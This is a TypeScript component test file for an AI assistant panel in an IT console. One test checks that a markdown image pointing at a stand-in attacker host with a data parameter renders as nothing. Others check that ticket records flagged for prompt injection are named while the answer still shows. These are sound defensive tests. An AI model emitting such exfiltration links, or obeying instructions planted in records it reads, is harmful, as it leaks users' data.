// Component tests against RENDERED OUTPUT (spec §8.4, §10.2, §10.6, §11.2).
//
// The three distinctions this file exists to keep apart, each of which a "the
// page rendered" test would miss:
//
//   * "the panel is disabled" and "the console still works" are DIFFERENT
//     FAILURES. §10.6 requires both, so both are asserted, and the second is
//     asserted against a sibling that a thrown ChatPanel would take down with
//     it.
//   * a partial answer that SAYS it is partial, versus one that reads as
//     complete. The server appends its own notice prose; the panel renders its
//     own marker from `stop_reason`. Both are asserted, because a panel that
//     dropped `partial` entirely would still show the server's sentence and
//     look fine.
//   * an injection flag that names the record AND STILL SHOWS THE ANSWER.
//     Refusing to answer is the denial of service §8.4 forbids, so "the flag
//     rendered" is only half the assertion.

import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Component, type ReactNode } from "react";
import { MemoryRouter } from "react-router-dom";
import { describe, expect, it, vi } from "vitest";
import type { ApiClient } from "../../../lib/api";
import { AiSettingsPage } from "../AiSettingsPage";
import { ChatPanel, mergeTurns } from "../ChatPanel";
import { EGRESS_DISCLOSURE } from "../egress";
import { MessageList } from "../MessageList";
import {
  PROVIDER_OFF_SUMMARY,
  SERVER_ADMIN_DETAIL,
  SERVER_ADMIN_HEADING,
  describeProvider,
} from "../provider";
import { ToolTrace } from "../ToolTrace";
import type { AiRenderedTurn } from "../types";

const mockUseApi = vi.fn();
vi.mock("../../../lib/ApiContext", () => ({ useApi: () => mockUseApi() }));

/** Renders its fallback if anything below it throws. A disabled AI feature must
 * never reach it — that is the difference between "off" and "broken". */
class Boundary extends Component<{ children: ReactNode }, { failed: boolean }> {
  state = { failed: false };
  static getDerivedStateFromError() {
    return { failed: true };
  }
  render() {
    return this.state.failed ? <p>the console crashed</p> : this.props.children;
  }
}

function renderWithProviders(node: ReactNode) {
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={queryClient}>
      <MemoryRouter>
        <Boundary>{node}</Boundary>
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

function stubApi(overrides: Partial<ApiClient>): ApiClient {
  const api = {
    me: vi.fn().mockResolvedValue({
      user_id: "u1",
      org_id: "o1",
      email: "a@b.c",
      display_name: "A",
      permissions: ["ai.use", "ai.admin"],
    }),
    getAiStatus: vi.fn().mockResolvedValue({ enabled: true, reason: "" }),
    listAiSessions: vi.fn().mockResolvedValue([]),
    createAiSession: vi.fn(),
    getAiSession: vi.fn(),
    deleteAiSession: vi.fn(),
    createAiTurn: vi.fn(),
    getAiSettings: vi.fn().mockResolvedValue({
      enabled: false,
      provider_key: null,
      transcript_retention_days: 30,
      max_turns_per_user_per_minute: 6,
      max_turns_per_org_per_hour: 200,
      daily_token_budget: null,
    }),
    updateAiSettings: vi.fn(),
    listAiProviders: vi.fn().mockResolvedValue([]),
    listAiInjectionFlags: vi.fn().mockResolvedValue([]),
    ...overrides,
  } as unknown as ApiClient;
  mockUseApi.mockReturnValue(api);
  return api;
}

function turn(overrides: Partial<AiRenderedTurn> = {}): AiRenderedTurn {
  return {
    id: "t1",
    role: "assistant",
    content: "Two tickets were opened today.",
    toolCalls: [],
    flagged: [],
    ...overrides,
  };
}

// --------------------------------------------------------------------------
// §10.6 — the panel never blocks the console
// --------------------------------------------------------------------------

describe("ChatPanel when the feature is off", () => {
  it("renders the server's explanation, not a spinner and not an error", async () => {
    stubApi({
      getAiStatus: vi.fn().mockResolvedValue({
        enabled: false,
        reason: "the AI assistant is turned off for this organization",
      }),
    });

    renderWithProviders(
      <>
        <ChatPanel />
        <nav aria-label="console">
          <a href="/devices">Devices</a>
        </nav>
      </>,
    );

    // 1. The explanation, verbatim from the server. The console must not
    //    second-guess WHY: "disabled for this org" and "no provider configured
    //    on this server" are different problems with different owners.
    expect(
      await screen.findByText(/turned off for this organization/i),
    ).toBeInTheDocument();
    expect(screen.queryByRole("progressbar")).toBeNull();
    expect(screen.queryByText(/the console crashed/i)).toBeNull();

    // 1b. AUDIT [MEDIUM]: the way OUT of the dead end is a real control, and
    //     the card no longer repeats the page's own <h1> as an <h2> right
    //     under it. Falsified against the previous card, which rendered
    //     `<h2>Assistant</h2>` above a bare underlined "Assistant settings"
    //     link.
    expect(
      screen.getByRole("link", { name: /open assistant settings/i }),
    ).toBeInTheDocument();
    expect(screen.queryByRole("heading", { name: "Assistant", level: 2 })).toBeNull();

    // 2. A DIFFERENT FAILURE: the rest of the console still renders. A
    //    ChatPanel that threw would unmount this sibling along with itself, so
    //    this assertion genuinely sees that case.
    expect(screen.getByRole("navigation", { name: "console" })).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Devices" })).toBeInTheDocument();

    // 3. And there is nothing to type into: an enabled composer over a disabled
    //    feature is an invitation to a 503.
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  // ------------------------------------------------------------------
  // AUDIT [MEDIUM]: "the card body reads verbatim: 'the AI assistant is turned
  // off for this organization' — no leading capital, no full stop, no icon ...
  // The sentence casing marks it as an unpolished developer string rather than
  // product copy, and it appears alongside a properly capitalised, punctuated
  // page description directly above it."
  // ------------------------------------------------------------------

  it("renders the server's reason as a sentence, capitalised and closed", async () => {
    stubApi({
      getAiStatus: vi.fn().mockResolvedValue({
        enabled: false,
        reason: "the AI assistant is turned off for this organization",
      }),
    });
    renderWithProviders(<ChatPanel />);

    // FALSIFIER: the previous version rendered `{reason}` straight through, so
    // this exact string was absent and the lowercase one was present.
    expect(
      await screen.findByText("The AI assistant is turned off for this organization."),
    ).toBeInTheDocument();
    expect(
      screen.queryByText("the AI assistant is turned off for this organization"),
    ).toBeNull();
  });

  it("does not invent a second full stop on a reason the server already closed", async () => {
    // The WORDS are the server's; only the first letter and the final stop are
    // this console's business, and a reason that already ends in one must not
    // acquire "..".
    stubApi({
      getAiStatus: vi
        .fn()
        .mockResolvedValue({ enabled: false, reason: "No provider is configured." }),
    });
    renderWithProviders(<ChatPanel />);
    expect(await screen.findByText("No provider is configured.")).toBeInTheDocument();
  });

  it("renders the ask box when the feature is on", async () => {
    stubApi({});
    renderWithProviders(<ChatPanel />);
    expect(await screen.findByRole("textbox")).toBeInTheDocument();
  });

  // AUDIT [MEDIUM]: "H1: Assistant directly above H2: Assistant — which
  // screen-reader users hear twice in a row." The DISABLED branch lost its
  // duplicate in an earlier cycle; the enabled one kept it, which is the state
  // an operator with the feature on sees every time.
  it("does not repeat the page's own H1 as an H2 when the feature is ON", async () => {
    stubApi({});
    renderWithProviders(<ChatPanel />);
    await screen.findByRole("textbox");
    const assistantHeadings = screen
      .getAllByRole("heading")
      .filter((heading) => heading.textContent === "Assistant");
    expect(assistantHeadings).toHaveLength(1);
    expect(assistantHeadings[0]?.tagName).toBe("H1");
  });

  it("offers the settings link to an ai.admin holder even while disabled", async () => {
    // The person reading "it is turned off" is exactly the person who can turn
    // it on, so the link belongs in the disabled state as much as the enabled
    // one.
    stubApi({
      getAiStatus: vi
        .fn()
        .mockResolvedValue({ enabled: false, reason: "the AI assistant is turned off" }),
    });
    renderWithProviders(<ChatPanel />);
    expect(
      await screen.findByRole("link", { name: /assistant settings/i }),
    ).toHaveAttribute("href", "/assistant/settings");
  });
});

// --------------------------------------------------------------------------
// The "Recent sessions" panel -- `useAiSessions()` existed in api.ts with no
// page wired to it before this migration. Real data (title, persona, message
// count), and the three states a mock never distinguishes.
// --------------------------------------------------------------------------

describe("ChatPanel's recent-sessions panel", () => {
  it("says it is loading rather than showing no sessions", async () => {
    stubApi({ listAiSessions: () => new Promise<never>(() => {}) });
    renderWithProviders(<ChatPanel />);
    expect(await screen.findByText("Loading…")).toBeInTheDocument();
  });

  it("says the request FAILED rather than showing no sessions", async () => {
    stubApi({ listAiSessions: vi.fn().mockRejectedValue(new Error("boom")) });
    renderWithProviders(<ChatPanel />);
    expect(await screen.findByRole("alert")).toBeInTheDocument();
    expect(screen.queryByText("No sessions yet.")).not.toBeInTheDocument();
  });

  it("lists real sessions rather than a mock count", async () => {
    stubApi({
      listAiSessions: vi.fn().mockResolvedValue([
        {
          id: "s1",
          title: "Disk alert response",
          persona: "admin",
          mode: "read",
          model_id: "m1",
          created_at: "2026-08-16T09:00:00Z",
          last_turn_at: "2026-08-16T09:05:00Z",
          message_count: 4,
          total_input_tokens: 10,
          total_output_tokens: 20,
        },
      ]),
    });
    renderWithProviders(<ChatPanel />);
    expect(await screen.findByText("Disk alert response")).toBeInTheDocument();
    expect(screen.getByText(/4 messages/)).toBeInTheDocument();
  });
});

describe("mergeTurns", () => {
  const stored = [
    {
      id: "turn-1",
      role: "assistant",
      content: "Two tickets were opened today.",
      tool_calls: [],
      flags: { partial: true, stop_reason: "tool_budget" },
    },
  ];

  it("carries the live turn's flagged records onto the stored turn", () => {
    // §8.4 clause 3, across a refetch. `ai_injection_flag` is served on the
    // `ai.admin` route only, so the stored transcript cannot carry the records
    // and a naive render would show the answer that named the ticket for one
    // second and then replace it with the same answer saying nothing.
    const flagged = [
      {
        tool: "tickets.list",
        source_type: "ticket",
        source_id: "TCK-1043",
        matched_rule: "redirection",
      },
    ];
    const merged = mergeTurns(stored, {
      turn_id: "turn-1",
      answer: "",
      stop_reason: "answer",
      partial: false,
      tool_calls: [],
      input_tokens: 0,
      output_tokens: 0,
      duration_ms: 0,
      model_id: "",
      flagged,
      warnings: [],
    });

    const [only] = merged;
    expect(only?.flagged).toEqual(flagged);
    // And the STORED flags still win for partiality: the server decided that.
    expect(only?.partial).toBe(true);
    expect(only?.stopReason).toBe("tool_budget");
  });

  it("does not attach a different turn's flagged records", () => {
    const merged = mergeTurns(stored, {
      turn_id: "turn-2",
      answer: "",
      stop_reason: "answer",
      partial: false,
      tool_calls: [],
      input_tokens: 0,
      output_tokens: 0,
      duration_ms: 0,
      model_id: "",
      flagged: [
        {
          tool: "tickets.list",
          source_type: "ticket",
          source_id: "TCK-9999",
          matched_rule: "redirection",
        },
      ],
      warnings: [],
    });

    expect(merged[0]?.flagged).toEqual([]);
  });
});

// --------------------------------------------------------------------------
// §10.1 — a partial answer says it is partial
// --------------------------------------------------------------------------

describe("MessageList", () => {
  it("renders a partial answer as partial and names the budget", () => {
    render(
      <MessageList
        turns={[
          turn({
            content:
              "Two tickets were opened today.\n\nI stopped early: this turn " +
              "reached its budget of 8 tool calls. The answer above is partial.",
            partial: true,
            stopReason: "tool_budget",
          }),
        ]}
      />,
    );

    // The server's own notice is preserved verbatim -- it is authored where the
    // budget is known, and the deadline path has no model left to ask.
    expect(screen.getByText(/budget of 8 tool calls/i)).toBeInTheDocument();
    // AND the panel's own marker, derived from `stop_reason`. This is the half
    // that disappears if the client drops `partial`: the server sentence would
    // still be there and the answer would still read as fine.
    const marker = screen.getByTestId("ai-partial");
    expect(marker).toHaveTextContent(/partial/i);
    expect(marker).toHaveTextContent(/tool call/i);
  });

  it("renders a complete answer with no partial marker", () => {
    render(<MessageList turns={[turn()]} />);
    expect(screen.queryByTestId("ai-partial")).toBeNull();
    expect(screen.getByText(/two tickets were opened today/i)).toBeInTheDocument();
  });

  it("names a flagged record and still renders the answer", () => {
    // §8.4 clause 3. Both halves: refusing the answer is the denial of service
    // the spec forbids, and a silent answer over injected content is the
    // failure the flag exists to surface.
    render(
      <MessageList
        turns={[
          turn({
            content: "Two tickets were opened today, both about printing.",
            flagged: [
              {
                tool: "tickets.list",
                source_type: "ticket",
                source_id: "TCK-1043",
                matched_rule: "instruction_to_reader",
              },
            ],
          }),
        ]}
      />,
    );

    const notice = screen.getByTestId("ai-injection-flag");
    expect(notice).toHaveTextContent("TCK-1043");
    expect(notice).toHaveTextContent(/addressed to an automated reader/i);
    expect(notice).toHaveTextContent(/treated as data and not acted on/i);
    expect(screen.getByText(/both about printing/i)).toBeInTheDocument();
  });

  it("renders an answer's markdown image as no element", () => {
    // The renderer's guarantee, asserted again where it actually reaches a
    // browser. `aiMarkdown.test.ts` pins the policy; this pins that the panel
    // uses it rather than some other path.
    render(
      <MessageList
        turns={[turn({ content: "Summary. ![x](https://attacker.test/?d=abc)" })]}
      />,
    );
    expect(document.querySelectorAll("img")).toHaveLength(0);
    expect(screen.getByText(/summary\./i)).toBeInTheDocument();
  });
});

// --------------------------------------------------------------------------
// §10.2 — honest truncation
// --------------------------------------------------------------------------

describe("ToolTrace", () => {
  it("shows a truncated result as truncated rather than as the whole answer", () => {
    render(
      <ToolTrace
        toolCalls={[
          { tool: "health.alerts", status: "ok", result_count: 50, truncated: true },
          { tool: "devices.health", status: "ok", result_count: 1, truncated: false },
        ]}
      />,
    );

    const truncated = screen.getByTestId("ai-tool-health.alerts");
    expect(truncated).toHaveTextContent("50");
    expect(truncated).toHaveTextContent(/more were not shown/i);
    const whole = screen.getByTestId("ai-tool-devices.health");
    expect(whole).not.toHaveTextContent(/more were not shown/i);
  });

  it("shows a denied tool call as denied rather than as an empty result", () => {
    // §13 test 1: an empty result presented as fact is worse than a refusal --
    // it produces a confident wrong answer instead of a visible failure.
    render(
      <ToolTrace
        toolCalls={[
          { tool: "devices.health", status: "forbidden", result_count: 0, truncated: false },
        ]}
      />,
    );
    const row = screen.getByTestId("ai-tool-devices.health");
    expect(row).toHaveTextContent(/not permitted/i);
    expect(row).not.toHaveTextContent(/0 records/i);
  });
});

// --------------------------------------------------------------------------
// §11.2's egress disclosure, and §0.14 — WHAT THE PAGE STOPPED OFFERING
//
// **THE DECISION CHANGED** (operator, 2026-08-25: "dont allow anyone to choose
// an AI model, we will use the same for every tenant and api key will be set in
// the .env per tenant, so this functionality must be shipped enabled and
// working already"). Everything below this line replaced tests that asserted
// the old contract, and each says what it used to say:
//
//   * `shows the egress disclosure verbatim and posts the acknowledgement`
//   * `cannot save an enabling change until the acknowledgement is ticked`
//   * `AiSettingsPage's labelling` — three controls, one of them the tickbox
//   * `AiSettingsPage's Save control` — six tests about a form that is gone
//   * `AiSettingsPage's Model provider control` — the picker
//   * `providerPickerOptions` — the picker's option builder
//
// **THE NEW RULE:** this page has no form. The provider, its model and its key
// are the deployment's `ITS_AI_*`; there is no per-org enable and no
// acknowledgement to give. The disclosure it all stood next to is UNCHANGED and
// still rendered verbatim, because what leaves the network did not change — only
// who consents to it, and where.
// --------------------------------------------------------------------------

describe("AiSettingsPage", () => {
  it("shows the egress disclosure verbatim, as information rather than as a consent", async () => {
    stubApi({
      listAiProviders: vi
        .fn()
        .mockResolvedValue([{ key: "hosted", kind: "anthropic", model: "a-model" }]),
    });

    renderWithProviders(<AiSettingsPage />);

    // The list is rendered VERBATIM from the shared constant, so a change to
    // what actually leaves cannot drift from what an administrator was shown.
    // This half is exactly what it was before the decision.
    for (const line of EGRESS_DISCLOSURE.leaves) {
      expect(await screen.findByText(line)).toBeInTheDocument();
    }
    for (const line of EGRESS_DISCLOSURE.neverLeaves) {
      expect(screen.getByText(line)).toBeInTheDocument();
    }

    // And the tickbox that used to sit under it is gone. Asserted as "no
    // checkbox at all" rather than by name: a renamed tickbox would pass a
    // name-based query's absence and still be the control this removed.
    expect(screen.queryAllByRole("checkbox")).toHaveLength(0);
  });

  it("puts both lists on a caption rung under the panel title, and keeps them looking like lists", async () => {
    stubApi({
      listAiProviders: vi
        .fn()
        .mockResolvedValue([{ key: "hosted", kind: "anthropic", model: "a-model" }]),
    });

    renderWithProviders(<AiSettingsPage />);

    // `.k` is the kit's caption — `--t-cap`, tracked, uppercased in CSS. The
    // head was `--t-body` 600 directly under a 15px semibold panel title: a
    // 1.5px step, which reads as no step at all. Both lists are captioned now;
    // only one of them was.
    const never = await screen.findByRole("heading", { name: "What never leaves" });
    const leaves = screen.getByRole("heading", { name: "What leaves" });
    for (const head of [leaves, never]) {
      expect(head.className.split(/\s+/)).toContain("k");
    }

    // Tailwind's preflight removes `list-style`, so a `<ul>` with a
    // `padding-left` and nothing else renders as indented sentences. Every
    // list in this panel declares its marker.
    const panel = never.closest(".panel");
    expect(panel).not.toBeNull();
    const lists = Array.from(panel?.querySelectorAll("ul") ?? []);
    expect(lists).toHaveLength(2);
    for (const list of lists) {
      expect(list.style.listStyle).toContain("disc");
    }
  });

  it("offers no control that could enable, disable or aim the assistant", async () => {
    const api = stubApi({
      listAiProviders: vi
        .fn()
        .mockResolvedValue([{ key: "hosted", kind: "anthropic", model: "a-model" }]),
      updateAiSettings: vi.fn(),
    });

    renderWithProviders(<AiSettingsPage />);
    await screen.findByText(EGRESS_DISCLOSURE.leaves[0] as string);

    // The three controls the audit measured, all three now absent: the
    // provider combobox, the acknowledgement tickbox and the enable tickbox.
    expect(screen.queryByRole("combobox")).not.toBeInTheDocument();
    expect(screen.queryAllByRole("checkbox")).toHaveLength(0);
    expect(screen.queryByRole("button", { name: /save/i })).not.toBeInTheDocument();
    // Nothing on the page can write settings, so nothing does.
    expect(api.updateAiSettings).not.toHaveBeenCalled();
  });

  it("states which provider this deployment sends to, beside what it sends", async () => {
    // THE PROVIDER, under WHAT GOES. `kind · model` and not the key alone:
    // the key is an operator's private naming and says nothing about the
    // destination. Key material is not in the response and cannot appear here.
    stubApi({
      listAiProviders: vi
        .fn()
        .mockResolvedValue([{ key: "hosted", kind: "anthropic", model: "a-model" }]),
    });

    renderWithProviders(<AiSettingsPage />);

    // The key sentence-cased and the kind hyphenated the way the design writes
    // it; the model id untouched. Nothing is translated -- see `describeProvider`.
    expect(await screen.findByText("Hosted")).toBeInTheDocument();
    expect(screen.getByText("· anthropic · a-model")).toBeInTheDocument();
    // It is a statement, not a control: no element on the page takes it as a
    // value the administrator could change.
    expect(screen.queryByRole("combobox")).not.toBeInTheDocument();
    expect(screen.queryByRole("option")).not.toBeInTheDocument();
  });

  // ------------------------------------------------------------------------
  // Language pass, 2026-09-11 (`docs/design/settings-language.md`, "Second
  // surfaces carrying the old words"). The single test below --
  // "names the environment variables when the deployment has no provider" --
  // asserted the OLD one-sentence hint (`PROVIDER_UNCONFIGURED_HINT`),
  // addressed to an org admin who cannot act on an environment variable. The
  // shipped fix on `Settings → Assistant` (`AssistantTab.tsx`,
  // `assistant.test.tsx`'s own two tests of the same shape) splits that
  // sentence in two: what changed for THIS reader, always visible, and the
  // variable names behind a disclosure for whoever can actually set them.
  // `AiSettingsPage.tsx` now renders the identical split from the same
  // constants (`provider.ts`), so the two screens read the same story — the
  // two tests below are RE-POINTED to that split rather than deleted, and a
  // third pins that it is a real, openable disclosure and not a sentence that
  // merely moved.
  // ------------------------------------------------------------------------

  it("says the assistant is off for everyone on this server, not that it 'cannot be enabled'", async () => {
    // RE-POINTED from "names the environment variables when the deployment
    // has no provider": that test read the variable names straight out of
    // `role="status"`. They are no longer there — see the disclosure tests
    // below — so this is genuinely new coverage of what IS still always
    // visible: the org-admin-facing consequence sentence.
    stubApi({ listAiProviders: vi.fn().mockResolvedValue([]) });
    renderWithProviders(<AiSettingsPage />);

    // Asserted against the constant this page and `Settings → Assistant`
    // both import from `provider.ts`, not a retyped literal -- see
    // `assistant.test.tsx`'s matching test for why.
    const status = await screen.findByRole("status");
    expect(status).toHaveTextContent(PROVIDER_OFF_SUMMARY);
    // The consequence sentence changed with the decision: "the assistant
    // cannot be enabled" sends a reader hunting for an enable control that no
    // longer exists.
    expect(status).not.toHaveTextContent(/cannot be enabled/i);
    // §0.10 keeps providers out of the console on purpose -- an "add one
    // here" link would point at a page that must never exist.
    expect(screen.queryByRole("link", { name: /add a provider/i })).not.toBeInTheDocument();
  });

  it("keeps the environment variable names behind a disclosure for the server administrator", async () => {
    // GENUINELY NEW COVERAGE, not a rename: the old hint put the variable
    // names in the same always-visible sentence as the org-admin-facing
    // warning (the `role="status"` element itself, asserted above to no
    // longer contain them). They now live behind a closed `<details>` titled
    // "What the server administrator needs to set" -- this proves the
    // disclosure exists, starts closed, holds every variable name verbatim,
    // and opens.
    stubApi({ listAiProviders: vi.fn().mockResolvedValue([]) });
    renderWithProviders(<AiSettingsPage />);

    const status = await screen.findByRole("status");
    expect(status).not.toHaveTextContent(/ITS_AI_PROVIDERS/);

    const summary = await screen.findByText(SERVER_ADMIN_HEADING);
    const disclosure = summary.closest("details");
    expect(disclosure).not.toHaveAttribute("open");

    const detail = screen.getByText(SERVER_ADMIN_DETAIL);
    expect(detail.closest("details")).toBe(disclosure);
    expect(detail).toHaveTextContent(/ITS_AI_<KEY>_KIND/);
    expect(detail).toHaveTextContent(/_BASE_URL/);
    expect(detail).toHaveTextContent(/_MODEL/);
    expect(detail).toHaveTextContent(/restart/i);
    expect(detail).toHaveTextContent(/exactly one provider/i);

    const user = userEvent.setup();
    await user.click(summary);
    expect(disclosure).toHaveAttribute("open");
  });

  it("points at the tab that still holds the org's dials, in the tab's own field names", async () => {
    // RE-POINTED, design review 2026-09-11
    // (`docs/design/settings-language.md`, "Second surfaces carrying the old
    // words"): the sentence named fields by their PRE-rename words
    // ("Transcript retention", "rate ceilings", "token budget") while
    // `AssistantTab.tsx`'s own fields had already been renamed to "Keep
    // conversations for", "Questions per person/organization" and "Daily
    // usage limit" -- a console pointing at a tab it describes in words that
    // tab no longer uses. The page's not losing its form is still the point
    // (kept from the prior version of this test); the genuine new target is
    // that the words match what is actually on the other tab.
    stubApi({ listAiProviders: vi.fn().mockResolvedValue([]) });
    renderWithProviders(<AiSettingsPage />);

    expect(await screen.findByText(/Settings → Assistant/)).toBeInTheDocument();
    expect(screen.queryByText(/Transcript retention/i)).not.toBeInTheDocument();
    expect(screen.queryByText(/rate ceiling/i)).not.toBeInTheDocument();
    expect(screen.queryByText(/token budget/i)).not.toBeInTheDocument();
    expect(screen.getByText(/daily usage limit/i)).toBeInTheDocument();
  });

  // Design review, 2026-09-11: "Where it goes" means two different things" --
  // it was this page's own panel title AND the glossary's replacement for
  // "channel" on Settings → Notifications, adjacent tabs, one phrase, two
  // referents. This page's panel is retitled "Provider" (it already has a KV
  // row of that name once a provider is configured); Notifications is free to
  // use the phrase for its own concept without colliding with this one.
  it("titles its provider panel 'Provider', not the phrase Notifications needs for 'channel'", async () => {
    stubApi({
      listAiProviders: vi
        .fn()
        .mockResolvedValue([{ key: "hosted", kind: "anthropic", model: "a-model" }]),
    });
    renderWithProviders(<AiSettingsPage />);

    expect(await screen.findByRole("heading", { name: "Provider" })).toBeInTheDocument();
    expect(screen.queryByText("Where it goes")).not.toBeInTheDocument();
  });
});

describe("describeProvider", () => {
  it("answers null when the deployment configured nothing", () => {
    // The unconfigured deployment is the ONE remaining unavailability path, so
    // this branch is the one the hint above hangs off.
    expect(describeProvider([])).toBeNull();
    expect(describeProvider(undefined)).toBeNull();
  });

  it("carries kind · model beside the key, written the way the design writes it", () => {
    // v3 draws this exact line as "Local · openai-compatible · gpt-oss-120b";
    // it read "local openai_compatible · gpt-oss-120b" -- a raw enum with an
    // underscore, and two facts with no separator between them.
    expect(describeProvider([{ key: "local", kind: "openai_compatible", model: "m" }])).toEqual({
      key: "Local",
      detail: "openai-compatible · m",
    });
  });

  it("re-punctuates the kind and never renames it", () => {
    // The one guard on the line above: a kind this console has never seen is
    // shown as it is stored, minus the underscores. No mapping, no fallback,
    // nothing dropped.
    expect(describeProvider([{ key: "x", kind: "some_new_kind", model: "m" }])).toEqual({
      key: "X",
      detail: "some-new-kind · m",
    });
  });

  it("takes the first when a server somehow answers with two", () => {
    // The server refuses a second provider at startup (§0.14), so this cannot
    // reach a running console. Showing the one the server would resolve still
    // beats a crash, and pinning it means the fallback is a decision rather
    // than whatever the array happened to do.
    expect(
      describeProvider([
        { key: "local", kind: "openai_compatible", model: "m" },
        { key: "hosted", kind: "anthropic", model: "n" },
      ]),
    ).toEqual({ key: "Local", detail: "openai-compatible · m" });
  });
});
